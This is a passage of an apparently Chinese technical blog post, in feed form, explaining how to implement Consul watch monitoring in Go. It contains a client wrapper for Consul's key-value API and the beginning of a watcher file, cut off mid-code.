    <link href="/2022/12/04/%E5%9F%BA%E4%BA%8Econsul%E5%AE%9E%E7%8E%B0watch%E6%9C%BA%E5%88%B6/"/>
    <url>/2022/12/04/%E5%9F%BA%E4%BA%8Econsul%E5%AE%9E%E7%8E%B0watch%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="基于consul实现watch机制"><a href="#基于consul实现watch机制" class="headerlink" title="基于consul实现watch机制"></a>基于consul实现watch机制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>consul常常被用来作服务注册与服务发现，而它的watch机制则可被用来监控一些数据的更新，实时获取最新的数据。另外，在监控到数据变化后，还可以调用外部处理程序，此处理程序可以是任何可执行文件或HTTP调用，具体说明可见<a href="https://link.juejin.cn/?target=https://www.consul.io/docs/dynamic-app-config/watches">官网</a>。</p><p> 当前consul支持以下watch类型如下所示：</p><ul><li>key 监听一个consul kv中的key</li><li>keyprefix 监听consul kv中的key的前缀</li><li>services 监听有效服务的变化</li><li>nodes 监听节点的变化</li><li>service 监听服务的变化</li><li>checks 监听check的变化</li><li>event 监听自定义事件的变化</li></ul><p>从以上可以看出consul提供非常丰富的监听类型，通过这些类型我们可以实时观测到consul整个集群中的变化，从而实现一些特别的需求，比如：实时更新、服务告警等功能。</p><h2 id="基于Golang-实现watch-对服务变化的监控"><a href="#基于Golang-实现watch-对服务变化的监控" class="headerlink" title="基于Golang 实现watch 对服务变化的监控"></a>基于Golang 实现watch 对服务变化的监控</h2><p>consul官方提供了<a href="https://link.juejin.cn/?target=https://pkg.go.dev/github.com/hashicorp/consul/api/watch">Golang版的watch包</a>。其实际上也是对watch机制进行了一层封装，最终代码实现的只是对consul HTTP API 的 <code>endpoints</code>的使用，不涉及数据变化后的相关处理，封装程度不够。</p><p>接下来我将基于封装了的相关处理函数的工具包进行解决，详细代码可通过<a href="https://github.com/longpi1/consul-tool">https://github.com/longpi1/consul-tool</a> 进行下载查看。</p><p>1.客户端client.go 用于初始consul相关配置以及封装consul的api库的基础操作</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> backends<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/json&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/hashicorp/consul/api&quot;</span><br>errors <span class="hljs-string">&quot;github.com/longpi1/consul-tool/pkg/error&quot;</span><br><span class="hljs-string">&quot;github.com/longpi1/consul-tool/pkg/log&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-comment">// Option ...</span><br><span class="hljs-keyword">type</span> Option <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(opt *Config)</span></span><br><br><span class="hljs-comment">// NewConfig 初始化consul配置</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewConfig</span><span class="hljs-params">(opts ...Option)</span></span> *Config &#123;<br>c := &amp;Config&#123;<br>conf:     api.DefaultConfig(),<br>watchers: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*watcher),<br>logger:   log.NewLogger(),<br>&#125;<br><br><span class="hljs-keyword">for</span> _, o := <span class="hljs-keyword">range</span> opts &#123;<br>o(c)<br>&#125;<br><br><span class="hljs-keyword">return</span> c<br>&#125;<br><br><span class="hljs-comment">// Config 相关配置的结构体</span><br><span class="hljs-keyword">type</span> Config <span class="hljs-keyword">struct</span> &#123;<br>sync.RWMutex<br>logger   log.Logger<br>kv       *api.KV<br>conf     *api.Config<br>watchers <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*watcher<br>prefix   <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-comment">// 循环监听</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> watcherLoop(path <span class="hljs-type">string</span>) &#123;<br>c.logger.Info(<span class="hljs-string">&quot;watcher start...&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>, path)<br><br>w := c.getWatcher(path)<br><span class="hljs-keyword">if</span> w == <span class="hljs-literal">nil</span> &#123;<br>c.logger.Error(<span class="hljs-string">&quot;watcher not found&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>, path)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">if</span> err := w.run(c.conf.Address, c.conf); err != <span class="hljs-literal">nil</span> &#123;<br>c.logger.Warn(<span class="hljs-string">&quot;watcher connect error&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>, path, <span class="hljs-string">&quot;error&quot;</span>, err)<br>time.Sleep(time.Second * <span class="hljs-number">3</span>)<br>&#125;<br><br>w = c.getWatcher(path)<br><span class="hljs-keyword">if</span> w == <span class="hljs-literal">nil</span> &#123;<br>c.logger.Info(<span class="hljs-string">&quot;watcher stop&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>, path)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.logger.Warn(<span class="hljs-string">&quot;watcher reconnect...&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>, path)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 重置consul的watcher</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Reset() <span class="hljs-type">error</span> &#123;<br>watchMap := c.getAllWatchers()<br><br><span class="hljs-keyword">for</span> _, w := <span class="hljs-keyword">range</span> watchMap &#123;<br>w.stop()<br>&#125;<br><br><span class="hljs-keyword">return</span> c.Init()<br>&#125;<br><br><span class="hljs-comment">// Init 初始化consul客户端</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Init() <span class="hljs-type">error</span> &#123;<br>client, err := api.NewClient(c.conf)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;init fail: %w&quot;</span>, err)<br>&#125;<br><br>c.kv = client.KV()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// Put 插入该路径的kv</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Put(path <span class="hljs-type">string</span>, value <span class="hljs-keyword">interface</span>&#123;&#125;) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">var</span> (<br>data []<span class="hljs-type">byte</span><br>err  <span class="hljs-type">error</span><br>)<br><br>data, err = json.Marshal(value)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>data = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;%v&quot;</span>, value))<br>&#125;<br><br>p := &amp;api.KVPair&#123;Key: c.absPath(path), Value: data&#125;<br>_, err = c.kv.Put(p, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;put fail: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// Get 获取该路径的kv</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Get(keys ...<span class="hljs-type">string</span>) (ret *KV) &#123;<br><span class="hljs-keyword">var</span> (<br>path   = c.absPath(keys...) + <span class="hljs-string">&quot;/&quot;</span><br>fields []<span class="hljs-type">string</span><br>)<br><br>ret = &amp;KV&#123;&#125;<br>ks, err := c.list()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ret.err = fmt.Errorf(<span class="hljs-string">&quot;get list fail: %w&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, k := <span class="hljs-keyword">range</span> ks &#123;<br><span class="hljs-keyword">if</span> !strings.HasPrefix(path, k+<span class="hljs-string">&quot;/&quot;</span>) &#123;<br>ret.err = errors.ErrKeyNotFound<br><span class="hljs-keyword">continue</span><br>&#125;<br>field := strings.TrimSuffix(strings.TrimPrefix(path, k+<span class="hljs-string">&quot;/&quot;</span>), <span class="hljs-string">&quot;/&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(field) != <span class="hljs-number">0</span> &#123;<br>fields = strings.Split(field, <span class="hljs-string">&quot;/&quot;</span>)<br>&#125;<br><br>kvPair, _, err := c.kv.Get(k, <span class="hljs-literal">nil</span>)<br>ret.value = kvPair.Value<br>ret.key = strings.TrimSuffix(strings.TrimPrefix(path, c.prefix+<span class="hljs-string">&quot;/&quot;</span>), <span class="hljs-string">&quot;/&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;get fail: %w&quot;</span>, err)<br>&#125;<br>ret.err = err<br><span class="hljs-keyword">break</span><br>&#125;<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fields) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>ret.key += <span class="hljs-string">&quot;/&quot;</span> + strings.Join(fields, <span class="hljs-string">&quot;/&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// Delete 删除该路径的kv</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Delete(path <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>_, err := c.kv.Delete(c.absPath(path), <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;delete fail: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// Watch   实现监听</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Watch(path <span class="hljs-type">string</span>, handler <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*KV)</span></span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// 初始化watcher</span><br>watcher, err := newWatcher(c.absPath(path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;watch fail: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 对应的路径发生变化时，调用对应的处理函数</span><br>watcher.setHybridHandler(c.prefix, handler)<br><span class="hljs-comment">// 相应路径下添加对应的wathcer用于实现watch机制</span><br>err = c.addWatcher(path, watcher)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 调用协程循环监听</span><br><span class="hljs-keyword">go</span> c.watcherLoop(path)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// StopWatch 停止监听</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> StopWatch(path ...<span class="hljs-type">string</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path) == <span class="hljs-number">0</span> &#123;<br>c.cleanWatcher()<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> path &#123;<br>wp := c.getWatcher(p)<br><span class="hljs-keyword">if</span> wp == <span class="hljs-literal">nil</span> &#123;<br>c.logger.Info(<span class="hljs-string">&quot;watcher already stop&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>, p)<br><span class="hljs-keyword">continue</span><br>&#125;<br><br>c.removeWatcher(p)<br>wp.stop()<br><span class="hljs-keyword">for</span> !wp.IsStopped() &#123;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 获取绝对路径</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> absPath(keys ...<span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(keys) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> c.prefix<br>&#125;<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(keys[<span class="hljs-number">0</span>]) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> c.prefix<br>&#125;<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c.prefix) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> strings.Join(keys, <span class="hljs-string">&quot;/&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">return</span> c.prefix + <span class="hljs-string">&quot;/&quot;</span> + strings.Join(keys, <span class="hljs-string">&quot;/&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> list() ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>keyPairs, _, err := c.kv.List(c.prefix, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>list := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(keyPairs))<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> keyPairs &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(v.Value) != <span class="hljs-number">0</span> &#123;<br>list = <span class="hljs-built_in">append</span>(list, v.Key)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> list, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// WithPrefix ...</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithPrefix</span><span class="hljs-params">(prefix <span class="hljs-type">string</span>)</span></span> Option &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Config)</span></span> &#123;<br>c.prefix = prefix<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// WithAddress ...</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAddress</span><span class="hljs-params">(address <span class="hljs-type">string</span>)</span></span> Option &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Config)</span></span> &#123;<br>c.conf.Address = address<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Withlogger ...</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Withlogger</span><span class="hljs-params">(logger log.Logger)</span></span> Option &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Config)</span></span> &#123;<br>c.logger = logger<br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">// CheckWatcher ...</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> CheckWatcher(path <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>c.RLock()<br><span class="hljs-keyword">defer</span> c.RUnlock()<br><br><span class="hljs-keyword">if</span> _, ok := c.watchers[c.absPath(path)]; ok &#123;<br><span class="hljs-keyword">return</span> errors.ErrAlreadyWatch<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> getWatcher(path <span class="hljs-type">string</span>) *watcher &#123;<br>c.RLock()<br><span class="hljs-keyword">defer</span> c.RUnlock()<br><br><span class="hljs-keyword">return</span> c.watchers[c.absPath(path)]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> addWatcher(path <span class="hljs-type">string</span>, w *watcher) <span class="hljs-type">error</span> &#123;<br>c.Lock()<br><span class="hljs-keyword">defer</span> c.Unlock()<br><br><span class="hljs-keyword">if</span> _, ok := c.watchers[c.absPath(path)]; ok &#123;<br><span class="hljs-keyword">return</span> errors.ErrAlreadyWatch<br>&#125;<br><br>c.watchers[c.absPath(path)] = w<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> removeWatcher(path <span class="hljs-type">string</span>) &#123;<br>c.Lock()<br><span class="hljs-keyword">defer</span> c.Unlock()<br><br><span class="hljs-built_in">delete</span>(c.watchers, c.absPath(path))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> cleanWatcher() &#123;<br>c.Lock()<br><span class="hljs-keyword">defer</span> c.Unlock()<br><br><span class="hljs-keyword">for</span> k, w := <span class="hljs-keyword">range</span> c.watchers &#123;<br>w.stop()<br><span class="hljs-built_in">delete</span>(c.watchers, k)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 获取所有的watcher</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> getAllWatchers() []*watcher &#123;<br>c.RLock()<br><span class="hljs-keyword">defer</span> c.RUnlock()<br><br>watchers := <span class="hljs-built_in">make</span>([]*watcher, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(c.watchers))<br><span class="hljs-keyword">for</span> _, w := <span class="hljs-keyword">range</span> c.watchers &#123;<br>watchers = <span class="hljs-built_in">append</span>(watchers, w)<br>&#125;<br><br><span class="hljs-keyword">return</span> watchers<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>2.watcher.go实现对watch机制相关函数的封装。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> backends<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;bytes&quot;</span><br>   <span class="hljs-string">&quot;fmt&quot;</span><br>   <span class="hljs-string">&quot;strings&quot;</span><br>   <span class="hljs-string">&quot;sync&quot;</span><br><br>   <span class="hljs-string">&quot;github.com/hashicorp/consul/api&quot;</span><br>   <span class="hljs-string">&quot;github.com/hashicorp/consul/api/watch&quot;</span><br>)<br><br><span class="hljs-comment">//初始化对应的watcher ，这里设置的是监听路径的类型，也可以支持service、node等，通过更改type</span><br><span class="hljs-comment">//支持的type类型有</span><br><span class="hljs-comment">//key - Watch a specific KV pair</span><br><span class="hljs-comment">//keyprefix - Watch a prefix in the KV store</span><br><span class="hljs-comment">//services - Watch the list of available services</span><br><span class="hljs-comment">//nodes - Watch the list of nodes</span><br><span class="hljs-comment">//service- Watch the instances of a service</span><br><span class="hljs-comment">//checks - Watch the value of health checks</span><br><span class="hljs-comment">//event - Watch for custom user events</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newWatcher</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> (*watcher, <span class="hljs-type">error</span>) &#123;<br>   wp, err := watch.Parse(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;keyprefix&quot;</span>, <span class="hljs-string">&quot;prefix&quot;</span>: path&#125;)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>   &#125;<br><br>   <span class="hljs-keyword">return</span> &amp;watcher&#123;<br>      Plan:       